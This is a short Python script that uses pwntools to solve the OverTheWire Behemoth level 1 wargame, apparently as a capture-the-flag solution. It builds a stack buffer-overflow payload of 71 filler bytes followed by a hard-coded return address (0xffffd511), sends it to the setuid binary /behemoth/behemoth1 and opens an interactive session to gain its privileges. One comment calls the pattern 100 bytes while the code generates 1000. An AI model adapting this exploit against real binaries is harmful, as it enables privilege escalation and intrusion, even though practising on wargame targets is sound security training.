from pwn import *

PATH = '/behemoth/behemoth1'

print(cyclic(1000))  # Generate a 100-byte cyclic pattern

# crash_addr = 0x66616168
# print(cyclic_find(crash_addr))
# find after how many bytes the ret-address is found, in this case, 71.
ret_addr_pos = 71
ret_addr = 0xffffd511

payload = ret_addr_pos * b'a'
payload += p32(ret_addr)

p = process(PATH)
p.sendline(payload)
p.interactive()

p.close()

